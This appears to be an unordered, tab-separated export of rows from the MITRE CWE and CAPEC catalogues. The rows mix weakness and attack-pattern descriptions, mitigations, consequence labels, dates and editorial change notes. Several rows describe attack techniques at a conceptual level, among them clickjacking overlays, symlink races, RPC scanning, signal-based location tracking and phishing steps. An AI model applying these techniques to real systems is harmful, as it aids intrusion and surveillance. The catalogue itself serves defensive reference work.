12403	23	The adversary exploits the target system's audio and video functionalities through malware or scheduled tasks. The goal is to capture sensitive information about the target for financial, personal, political, or other gains which is accomplished by collecting communication data between two parties via the use of peripheral devices (e.g. microphones and webcams) or applications with audio and video capabilities (e.g. Skype) on a system.
20647	59	Updated Attack_Phases
5733	43	Simple
12675	35	MITRE
18248	51	2014-06-23
16789	61	Draft
6294	53	The MITRE Corporation
13594	25	High
8842	35	MITRE
23408	26	Implementation
23557	39	2017-11-08
13393	62	updated Relationships, Taxonomy_Mappings
21134	23	The attacker forces an application to load arbitrary code files from the local machine. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load files that the attacker placed on the local machine during a prior attack, or to otherwise change the functionality of the targeted application in unexpected ways.
12432	55	CAPEC Content Team
19097	35	MITRE
18927	103	Primary
23493	28	CWE Content Team
8142	28	CWE Content Team
10715	89	Meta
24995	62	updated Common_Consequences, Relationships
17217	35	MITRE
14418	73	Use modified client (modified by reverse engineering) to inject input.
6129	31	1000
8499	35	MITRE
11219	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
10878	47	Execute Unauthorized Commands
16294	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
19923	85	79
11879	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
20302	35	MITRE
22553	85	138
11047	79	Integrity
17669	62	updated Time_of_Introduction
18333	103	Primary
18606	39	2014-07-30
24342	49	2012
22405	72	Another application can impersonate the operating system and cause the software to perform an unintended action.
22473	81	Non-Repudiation
15683	28	CWE Content Team
10300	39	2010-06-21
14634	35	MITRE
12746	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
16424	35	MITRE
17649	62	updated Description
6612	95	[Determine Target System] In certain cases, the adversary will explore an organization's network to determine a specific target machine to exploit based on the information it contains or privileges the main user may possess.
17056	21	CWE Content Team
22633	62	updated Potential_Mitigations
12670	57	Primary
12944	28	CWE Content Team
22087	56	ChildOf
21082	63	DoS: Crash, Exit, or Restart
9584	35	MITRE
18041	92	Experiment
12440	81	Other
10578	62	updated Relationships, Other_Notes, Taxonomy_Mappings
6127	39	2014-07-30
17287	79	Confidentiality
8706	62	updated Demonstrative_Examples
9296	35	Veracode
16973	23	An adversary scans for RPC services listing on a Unix/Linux host. This type of scan can be obtained via native operating system utilities or via port scanners like nmap. When performed by a scanner, an RPC datagram is sent to a list of UDP ports and the response is recorded. Particular types of responses can be indicative of well-known RPC services running on a UDP port. Direct RPC scans that bypass portmapper/sunrpc are typically slow compare to other scan types, are easily detected by IPS/IDS systems, and can only detect open ports when an RPC service responds. ICMP diagnostic message responses can help identify closed ports, however filtered and unfiltered ports cannot be identified through TCP RPC scans. There are two general approaches to RPC scanning: One is to use a native operating system utility, or script, to query the portmapper/rpcbind application running on port 111. Portmapper will return a list of registered RPC services. Alternately, one can use a port scanner or script to scan for RPC services directly. Discovering RPC services gives the attacker potential targets to attack, as some RPC services are insecure by default.
20892	35	MITRE
14641	31	1000
7091	21	CWE Content Team
20450	74	1
6811	39	2014-07-30
7309	39	2013-02-21
13023	43	Simple
22528	53	The MITRE Corporation
10567	62	added/updated demonstrative examples
18821	69	Draft
19526	91	Architecture and Design
22091	28	CWE Content Team
22883	67	Medium
23170	103	Primary
7946	100	The MITRE Corporation
20057	28	CWE Content Team
8997	23	In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system. While being logged in to some target system, the victim visits the attackers' malicious site which displays a UI that the victim wishes to interact with. In reality, the iFrame overlay page has a transparent layer above the visible UI with action controls that the attacker wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the attacker may have just tricked the victim into executing some potentially privileged (and most undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks he or she is clicking on versus what he or she is actually clicking on.
21557	23	In this attack scenario, the attacker passively monitors the signal strength of the target’s cellular RF signal or WiFi RF signal and uses the strength of the signal (with directional antennas and/or from multiple listening points at once) to identify the source location of the signal. Obtaining the signal of the target can be accomplished through multiple techniques such as through Cellular Broadcast Message Request or through the use of IMSI Tracking or WiFi MAC Address Tracking.
12802	35	MITRE
20768	31	699
9597	79	Integrity
19339	28	CWE Content Team
23477	28	CWE Content Team
15605	69	Draft
8094	44	SOAR Partial
10600	102	ChildOf
10397	56	ChildOf
16370	69	Incomplete
9506	86	http://www.zork.org/safestr/
19882	61	Stable
7183	35	MITRE
10696	40	Ciphertext is known.
22577	104	55
9036	92	Experiment
9005	39	2014-07-30
6365	91	Architecture and Design
21300	76	2019-09-30
22921	53	The MITRE Corporation
22832	35	MITRE
5716	35	MITRE
5931	51	2014-06-23
8022	39	2010-06-21
10373	28	CWE Content Team
18539	62	updated Demonstrative_Examples, Taxonomy_Mappings
8628	21	Evgeny Lebanidze
14480	35	Cigital
10999	79	Authorization
14090	53	The MITRE Corporation
11942	104	90
5695	62	updated Detection_Factors
15567	28	CWE Content Team
14033	56	ChildOf
10046	54	Medium
24079	50	Perform comprehensive threat modeling, a process of identifying, evaluating, and mitigating potential threats to the application. This effort can help reveal potentially obscure application functionality that can be manipulated for malicious purposes.
21186	35	MITRE
9593	39	2014-07-30
17427	39	2011-03-29
13993	47	Other
17757	71	2010
13711	91	Implementation
18165	39	2017-11-08
18031	35	MITRE
14141	39	2011-06-01
22811	39	2011-06-01
10042	90	C++
9505	35	MITRE
15281	94	A successful excessive allocation attack forces the target system to exhaust its resources, thereby compromising the availability of its service.
18929	35	MITRE
17876	28	CWE Content Team
14111	79	Availability
24375	89	Detailed
8631	35	MITRE
22862	102	ChildOf
23611	55	CAPEC Content Team
13106	39	2019-06-20
23428	35	MITRE
10753	46	This does not necessarily apply in languages or frameworks that automatically perform garbage collection, since the removal of all references may act as a signal that the resource is ready to be reclaimed.
7252	91	Architecture and Design
16900	81	Other
22562	39	2011-03-29
14626	35	MITRE
19813	55	CAPEC Content Team
20152	39	2009-03-10
22979	73	Craft malicious calls to features not intended to be used by general system users that take advantage of security flaws found in the functions.
8844	103	Primary
21974	35	MITRE
16112	69	Draft
7363	50	Restrict write access to logon scripts to necessary administrators.
22809	28	CWE Content Team
23826	76	2019-09-30
11348	50	Always check the size of the input data before copying to a buffer.
12721	74	1
10962	28	CWE Content Team
18894	39	2017-11-08
10873	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
21516	81	Availability
6763	86	http://blogs.sans.org/appsecstreetfighter/2010/03/25/top-25-series-rank-24-use-of-a-broken-or-risky-cryptographic-algorithm/
8546	69	Incomplete
11036	42	Be reluctant to use JNI calls. A Java API equivalent may exist.
10798	72	If the cookie in question is an authentication cookie, then not setting the HttpOnly flag may allow an adversary to steal authentication data (e.g., a session ID) and assume the identity of the user.
25025	69	Incomplete
8271	32	Horst Gortz Institute for IT-Security
5760	35	MITRE
14419	31	1000
20093	92	Experiment
24762	59	Updated Attack_Motivation-Consequences, Description Summary, Typical_Likelihood_of_Exploit, Typical_Severity
8117	28	CWE Content Team
22656	102	PeerOf
9005	62	updated Relationships, Taxonomy_Mappings
17386	62	updated Potential_Mitigations
21779	28	CWE Content Team
24037	101	CAPEC Content Team
15809	28	CWE Content Team
12486	56	ChildOf
14241	59	Updated Resources_Required
25362	39	2017-11-08
17194	35	MITRE
20870	33	Microsoft
20342	56	ChildOf
8221	45	Base
22347	56	ChildOf
14276	56	ChildOf
23215	49	2009
11141	39	2009-12-28
17586	46	Attackers can embed XSS exploits into the values for IMG attributes (e.g. SRC) that is streamed and then executed in a victim's browser. Note that when the page is loaded into a user's browsers, the exploit will automatically execute.
9723	53	The MITRE Corporation
14071	42	Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.
22626	56	ChildOf
22929	35	MITRE
11781	69	Incomplete
9743	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   Industry-standard implementations will save development time and may be more likely to avoid errors that can occur during implementation of cryptographic algorithms. Consider the ESAPI Encryption feature.
18098	28	CWE Content Team
7553	62	updated Potential_Mitigations, Relationships
6280	59	Updated Related_Attack_Patterns
16809	74	3
14226	39	2008-08-15
15990	26	Implementation
5678	103	Primary
14354	39	2010-02-16
23835	28	CWE Content Team
20968	100	The MITRE Corporation
6111	26	Architecture and Design
11215	59	Updated Attack_Motivation-Consequences
10081	102	ChildOf
17641	28	CWE Content Team
20244	62	updated References, Relationships
18548	74	3
24695	54	Medium
23023	51	2015-11-09
11748	71	2010
15303	35	MITRE
17622	68	The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.
9648	35	MITRE
20682	42	Use a parameterized query AND make sure that the accepted values conform to the business rules. Construct your SQL statement accordingly.
9190	39	2009-07-27
11172	50	Implementation: Perform input validation for all remote content.
14030	63	Bypass Protection Mechanism
10134	28	CWE Content Team
6874	94	Run Arbitrary Code
15898	57	Resultant
19092	59	Updated Related_Weaknesses
11292	101	CAPEC Content Team
22140	89	Detailed
15473	34	A typical occurrence of this weakness occurs when an application includes user-controlled input to a malloc() call. The related code might be correct with respect to preventing buffer overflows, but if a large value is provided, the malloc() will fail due to insufficient memory. This problem also frequently occurs when a parsing routine expects that certain elements will always be present. If malformed input is provided, the parser might return NULL. For example, strtok() can return NULL.
16803	26	Architecture and Design
15463	39	2008-07-01
19473	31	1000
20298	61	Stable
22640	42	When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.                   For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.
22962	90	C++
7622	76	2017-05-01
14225	35	MITRE
12312	28	Eric Dalci
10805	23	The program compares classes by name, which can cause it to use the wrong class when multiple classes can have the same name.
6554	39	2012-05-11
23454	91	Architecture and Design
14478	55	CAPEC Content Team
8938	55	CAPEC Content Team
20733	28	CWE Content Team
24055	56	ChildOf
6337	43	Simple
24067	35	MITRE
24781	35	MITRE
6631	28	CWE Content Team
19041	50	Perform output validation for all remote content.
10609	35	MITRE
8714	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
21019	50	Commercial defensive technology that monitors for rogue Wi-Fi access points, man-in-the-middle attacks, and anomalous activity with the mobile device baseband radios.
14683	81	Confidentiality
7605	100	The MITRE Corporation
25240	53	The MITRE Corporation
23397	53	The MITRE Corporation
19477	28	CWE Content Team
13656	39	2008-07-01
22918	59	Updated Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses
10195	35	MITRE
7591	39	2009-07-27
16164	81	Access Control
25301	35	Cigital
10694	31	1000
22823	35	MITRE
18819	43	Simple
8365	81	Other
6253	63	Execute Unauthorized Code or Commands
8203	42	When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.                   For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.
6602	35	MITRE
12956	39	2017-11-08
21087	102	ChildOf
22791	63	Gain Privileges or Assume Identity
11852	31	1000
23147	62	updated Demonstrative_Examples, Potential_Mitigations
16119	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
8676	60	23
6253	72	If the corrupted memory can be effectively controlled, it may be possible to execute arbitrary code. If the corrupted memory is data rather than instructions, the system will continue to function with improper changes, possibly in violation of an implicit or explicit policy.
10746	39	2011-06-27
11161	91	Architecture and Design
18649	28	CWE Content Team
8387	31	699
10764	28	CWE Content Team
23533	39	2011-09-13
19878	76	2015-12-07
8526	43	Simple
11483	62	updated Common_Consequences
16212	26	Implementation
20060	101	CAPEC Content Team
21946	55	CAPEC Content Team
14154	26	Architecture and Design
14163	39	2019-09-19
11839	39	2008-07-01
22870	62	updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings
16911	56	ChildOf
11516	62	updated Potential_Mitigations
8462	56	ChildOf
23901	39	2011-06-27
10767	62	updated Applicable_Platforms, Relationships, White_Box_Definitions
15271	59	Updated @Abstraction, Description, Related_Attack_Patterns
15450	90	Language-Independent
16270	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
14611	89	Detailed
20584	35	MITRE
11379	81	Availability
8365	63	Reduce Performance
8389	28	CWE Content Team
21059	28	CWE Content Team
17374	49	2008
21358	35	Cigital
15343	28	CWE Content Team
23462	35	MITRE
15418	28	CWE Content Team
20372	35	MITRE
19455	62	updated Relationships
17356	43	Simple
17803	89	Meta
7721	35	MITRE
8928	27	The attacker needs the ability to sniff traffic, and optionally be able to route said traffic to a system where the sniffing of traffic can take place, and act upon the recovered traffic in real time.
5625	28	CWE Content Team
6168	28	CWE Content Team
21328	42	Use a CPU and operating system that offers Data Execution Protection (NX) or its equivalent [REF-60] [REF-61].
8566	88	Return of Pointer Value Outside of Expected Range
11630	56	ChildOf
9676	101	CAPEC Content Team
20054	81	Confidentiality
8323	62	updated Demonstrative_Examples, Modes_of_Introduction, Relationships
10341	35	MITRE
10775	103	Primary
7512	69	Incomplete
21067	39	2017-01-19
15732	63	Read Application Data
23447	91	Architecture and Design
24916	39	2011-06-01
24369	35	MITRE
12607	39	2014-07-30
23276	62	updated Demonstrative_Examples
24547	28	CWE Content Team
18325	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
20703	35	MITRE
24643	27	Any tool capable of monitoring network communications, like a packet sniffer (e.g., Wireshark)
21037	104	131
11615	39	2009-05-27
15185	35	MITRE
18287	39	2011-06-01
14494	62	updated Relationships, Taxonomy_Mappings
20584	28	CWE Content Team
7282	101	CAPEC Content Team
8121	27	This attack can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.
22005	62	updated Common_Consequences
6800	26	Implementation
11752	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
20311	28	CWE Content Team
20422	21	CWE Content Team
12847	28	CWE Content Team
7745	21	PLOVER
10221	39	2014-07-30
7709	35	MITRE
6331	35	Cigital
20618	54	High
21813	91	Implementation
10590	40	An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc. which is flawed in some way.
17432	69	Draft
15019	28	CWE Content Team
20143	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
17098	91	System Configuration
12988	62	updated Relationships, Other_Notes, Taxonomy_Mappings
14301	28	CWE Content Team
24506	39	2011-06-27
12147	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
11149	31	699
22309	62	updated Relationships, Taxonomy_Mappings
14695	43	Simple
21710	31	1000
6294	55	CAPEC Content Team
21550	39	2009-05-27
9702	35	MITRE
13137	31	699
12435	35	MITRE
14953	79	Availability
13585	35	MITRE
9097	63	Read Files or Directories
17841	90	C++
6851	81	Integrity
19816	28	CWE Content Team
6406	31	1000
22350	42	When running on a web server that supports case-insensitive filenames, perform case-insensitive evaluations of the extensions that are provided.
22896	88	Incorrect Behavior Order: Authorization Before Parsing and Canonicalization
8884	49	2010
17442	28	CWE Content Team
8383	62	updated Relationships, Taxonomy_Mappings
9794	81	Access Control
15485	95	The adversary explores to gauge what level of access he has.
14714	102	ChildOf
15501	57	Indirect
18189	62	updated Description, Name, Relationships
17049	69	Draft
11881	73	Perform XSS attacks.
13575	28	CWE Content Team
9247	28	CWE Content Team
6200	62	updated Relationships, Taxonomy_Mappings
15878	28	CWE Content Team
16289	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Inter-application Flow Analysis
25039	62	updated Time_of_Introduction
9804	95	The first step is exploratory meaning the attacker scans for WSDL documents. The WDSL document written in XML is like a handbook on how to communicate with the web services provided by the target host. It provides an open view of the application (function details, purpose, functional break down, entry points, message types, etc.). This is very useful information for the attacker.
22529	88	Array Declared Public, Final, and Static
5778	101	CAPEC Content Team
20688	35	MITRE
9835	62	updated Description
25035	47	Read Data
14245	28	CWE Content Team
7036	63	Gain Privileges or Assume Identity
9149	62	updated Modes_of_Introduction, Potential_Mitigations, Time_of_Introduction
18510	35	MITRE
12978	23	This attack leverages the use of symbolic links (Symlinks) in order to write to sensitive files. An attacker can create a Symlink link to a target file not otherwise accessible to her. When the privileged program tries to create a temporary file with the same name as the Symlink link, it will actually write to the target file pointed to by the attackers' Symlink link. If the attacker can insert malicious content in the temporary file she will be writing to the sensitive file by using the Symlink. The race occurs because the system checks if the temporary file exists, then creates the file. The attacker would typically create the Symlink during the interval between the check and the creation of the temporary file.
24360	35	MITRE
13002	39	2011-06-01
13397	102	CanFollow
8352	35	MITRE
20599	61	Stable
14752	63	DoS: Crash, Exit, or Restart
21579	35	MITRE
9744	35	MITRE
20571	56	ChildOf
17401	54	High
16841	31	1003
8314	35	MITRE
19726	39	2011-06-01
14672	50	Implementation: Obfuscate server fields of HTTP response.
7596	81	Access Control
9404	77	Architecture or Design Review
7985	35	MITRE
7576	76	2017-05-01
5885	33	Josh Bush
22127	42	Use a static analysis tool to spot non-initialized variables.
9547	63	Hide Activities
8353	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
12595	69	Draft
20049	90	C#
10892	28	CWE Content Team
15421	25	Low
23617	28	CWE Content Team
22321	28	Eric Dalci
13133	23	An adversary subverts a communications protocol to perform an attack. This type of attack can allow an adversary to impersonate others, discover sensitive information, control the outcome of a session, or perform other attacks. This type of attack targets invalid assumptions that may be inherent in implementers of the protocol, incorrect implementations of the protocol, or vulnerabilities in the protocol itself.
25011	101	CAPEC Content Team
14344	26	Implementation
14204	56	ChildOf
18338	59	Updated Description Summary, Related_Attack_Patterns
23303	81	Access Control
11326	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.   While the interpetation of "too many operations" may vary for each product or developer, CISQ recommends a default maximum of 7 operations for the same data manager or file.
20072	31	1000
17677	56	ChildOf
7277	104	252
10149	62	updated Relationships
24024	28	CWE Content Team
23985	62	updated Potential_Mitigations
11562	35	MITRE
23616	39	2017-11-08
21916	104	212
21328	91	Operation
10101	28	CWE Content Team
20954	28	CWE Content Team
21994	72	Trust afforded to the system in question may allow for spoofing or redirection attacks.
15682	101	CAPEC Content Team
23245	45	Base
24088	91	Operation
22752	39	2017-05-03
15973	26	Implementation
7715	62	updated Taxonomy_Mappings
22254	39	2008-11-24
15751	35	MITRE
25268	28	CWE Content Team
21526	53	The MITRE Corporation
15938	62	updated Common_Consequences
11586	39	2011-06-27
10066	56	ChildOf
22896	69	Incomplete
19037	36	http://sharefuzz.sourceforge.net
21557	61	Draft
24257	35	Cigital
5769	28	CWE Content Team
25057	47	Gain Privileges
14839	62	updated Description, Other_Notes, Potential_Mitigations
25102	28	Eric Dalci
14207	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
12524	83	3rd "Zero Day" Edition,
21375	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
19740	62	updated Name
15856	46	When an application contains certain functions that perform operations requiring an elevated level of privilege, the caller of a privileged API must be careful to:                                                ensure that assumptions made by the APIs are valid, such as validity of arguments                   account for known weaknesses in the design/implementation of the API                   call the API from a safe context                                          If the caller of the API does not follow these requirements, then it may allow a malicious user or process to elevate their privilege, hijack the process, or steal sensitive data.             For instance, it is important to know if privileged APIs do not shed their privileges before returning to the caller or if the privileged function might make certain assumptions about the data, context or state information passed to it by the caller. It is important to always know when and how privileged APIs can be called in order to ensure that their elevated level of privilege cannot be exploited.
9896	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
10944	104	412
17497	35	MITRE
18414	81	Integrity
9338	35	MITRE
12829	35	MITRE
6272	85	319
24816	62	updated Relationships
14455	35	MITRE
8159	54	Low
18727	63	Hide Activities
20907	57	Indirect
11284	78	Low
15458	44	SOAR Partial
17998	28	CWE Content Team
6521	100	The MITRE Corporation
14783	70	DOM Based Cross Site Scripting or XSS of the Third Kind
7362	25	Low
19579	81	Integrity
9078	81	Integrity
15812	28	CWE Content Team
17694	73	Examine the file name extensions in URL, for example .php indicates PHP script interfaced with Apache server.
14377	56	ChildOf
14776	26	Implementation
20906	26	Implementation
20622	39	2009-07-17
24169	28	CWE Content Team
20969	35	MITRE
23888	79	Confidentiality
16235	97	Hiding Malicious Data or Code within Files
14542	42	Make the cloneable() method final.
24640	35	Cigital
25279	35	MITRE
14372	77	Automated Static Analysis
9103	45	Base
14885	62	updated Common_Consequences
15557	39	2010-02-16
21632	91	Architecture and Design
15318	59	Updated Related_Weaknesses
19962	62	added/updated demonstrative examples
23625	28	CWE Content Team
23294	39	2017-11-08
22255	35	MITRE
25387	27	The adversary must have the ability to deploy a custom hostile service for access by targeted clients and the abbility to communicate synchronously or asynchronously with client machine. The adversary must also control a remote site of some sort to redirect client and data to.
6923	24	MITRE
21614	62	updated Relationships
7888	35	MITRE
6533	56	ChildOf
19563	53	The MITRE Corporation
22591	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
11016	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
14481	39	2008-09-08
11567	35	MITRE
23019	62	updated Potential_Mitigations
16826	39	2014-07-30
23528	46	Users can be assigned to the wrong group (class) of permissions resulting in unintended access rights to sensitive objects.
15986	39	2012-05-11
24847	39	2017-11-08
7838	50	All sensitive information must be handled over a secure connection.
6745	55	CAPEC Content Team
15048	28	Eric Dalci
24603	69	Incomplete
25293	61	Draft
7475	89	Detailed
18588	88	Passing Mutable Objects to an Untrusted Method
21293	62	updated Name
16074	79	Integrity
24169	62	updated Description, Name, Relationships
12538	35	MITRE
16246	89	Detailed
22152	62	updated Background_Details, Other_Notes
15274	28	CWE Content Team
11332	26	Implementation
12399	28	CWE Content Team
22969	35	MITRE
15059	39	2014-06-23
23262	47	Other
13813	57	Primary
22540	33	Johannes Ullrich
12509	63	DoS: Resource Consumption (CPU)
10959	62	updated Related_Attack_Patterns, Relationships, Taxonomy_Mappings
10434	42	Reject any inconsistent types, such as a file with a .GIF extension that appears to consist of PHP code.
20470	23	The software specifies permissions for a security-critical resource in a way that allows that resource to be read or modified by unintended actors.
23000	35	MITRE
13131	62	updated References, Related_Attack_Patterns, Relationships
16967	48	09
10458	91	Architecture and Design
12205	39	2011-06-01
6349	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize '\dir\..\filename' (leading backslash dot dot) sequences that can resolve to a location that is outside of that directory.
5666	62	updated Other_Notes, Relationship_Notes
11494	62	updated Relationships, Other_Notes, References, Taxonomy_Mappings, Weakness_Ordinalities
6836	102	ChildOf
10142	24	MITRE
9353	94	A successful content spoofing attack compromises the integrity of the application data.
22062	35	MITRE
13267	42	Perform adequate input validation against any value that influences the amount of memory that is allocated. Define an appropriate strategy for handling requests that exceed the limit, and consider supporting a configuration option so that the administrator can extend the amount of memory to be used if necessary.
9246	28	CWE Content Team
12660	62	updated Common_Consequences, Relationships
19670	62	updated Time_of_Introduction
23945	59	Updated References
21548	35	MITRE
20291	39	2012-10-30
16241	62	updated Potential_Mitigations
12141	47	Bypass Protection Mechanism
8751	39	2009-10-29
7361	73	The attacker uses a tool such as the OSX "otool" utility or manually probes whether the target application uses dynamically linked libraries.
13561	35	MITRE
7802	103	Primary
22859	70	Hacking Exposed: Network Security Secrets & Solutions
21174	28	CWE Content Team
8622	80	Commercial tools are available.
23892	35	MITRE
16527	32	National Institute of Standards and Technology (NIST)
11971	21	CWE Content Team
5959	103	Primary
22320	39	2017-11-08
24057	39	2011-06-01
15975	28	CWE Content Team
14169	35	MITRE
13545	103	Primary
15161	51	2014-06-23
12344	84	08
25139	62	updated Relationships, Taxonomy_Mappings
15531	104	77
21615	62	updated Potential_Mitigations
11865	53	The MITRE Corporation
10694	56	ChildOf
19891	88	Compilation with Insufficient Warnings or Errors
12294	39	2008-09-08
13245	40	The target software is utilizing application framework APIs
21699	53	The MITRE Corporation
17565	43	Simple
16251	61	Draft
24950	39	2012-10-30
6020	55	CAPEC Content Team
8860	53	The MITRE Corporation
12161	35	MITRE
23739	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
23232	35	MITRE
12339	43	Simple
6489	101	CAPEC Content Team
20841	26	Implementation
25413	56	ChildOf
8065	100	The MITRE Corporation
15816	35	Cigital
12095	81	Other
22859	83	6th Edition
18772	62	updated Common_Consequences, Demonstrative_Examples, Observed_Examples, References, Relationships
14935	70	HTTP Parameter Pollution
11535	63	Modify Application Data
14681	35	MITRE
18492	81	Availability
12897	97	Enumerate Mail Exchange (MX) Records
5633	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
20646	28	CWE Content Team
13015	80	Sophisticated attack.
19081	33	Alex Allain
24219	62	updated Applicable_Platforms, Relationships, Relevant_Properties, Taxonomy_Mappings
8482	104	1044
24854	35	MITRE
19276	35	MITRE
25246	96	2008-01-18
19079	100	The MITRE Corporation
11624	45	Base
20066	85	180
19802	88	Invocation of a Control Element at an Unnecessarily Deep Horizontal Layer
17463	103	Primary
11708	39	2014-02-18
6466	28	CWE Content Team
17330	103	Primary
14306	26	Architecture and Design
8294	56	ChildOf
11403	35	MITRE
23401	62	updated Applicable_Platforms
15899	51	2014-06-23
21307	66	Breaking the memory secrecy assumption
7018	51	2014-06-23
17276	48	05
7860	28	CWE Content Team
22084	69	Incomplete
13985	39	2010-12-13
23613	59	Updated Resources_Required
6206	35	MITRE
13953	62	updated Demonstrative_Examples, Relationships
24123	28	CWE Content Team
6595	39	2013-07-17
16477	35	MITRE
24850	103	Primary
18384	53	The MITRE Corporation
21042	31	1000
14325	43	Simple
14472	28	CWE Content Team
21493	28	CWE Content Team
16633	104	339
17730	62	updated Related_Attack_Patterns
9830	69	Draft
13207	90	Language-Independent
15372	62	updated Relationships
12622	31	1000
12841	35	MITRE
19025	35	MITRE
9771	55	CAPEC Content Team
15239	102	ChildOf
18276	35	MITRE
7661	28	CWE Content Team
21487	88	ASP.NET Misconfiguration: Not Using Input Validation Framework
21451	66	Buffer Descriptions for I/O Control Codes
7416	56	CanPrecede
20619	87	Web Server
13698	47	Read Data
19523	92	Exploit
20797	31	1000
6923	21	CWE Content Team
18823	73	Execute a phishing attack and send a user an e-mail convincing the to click on a link leading the user to the malicious domain.
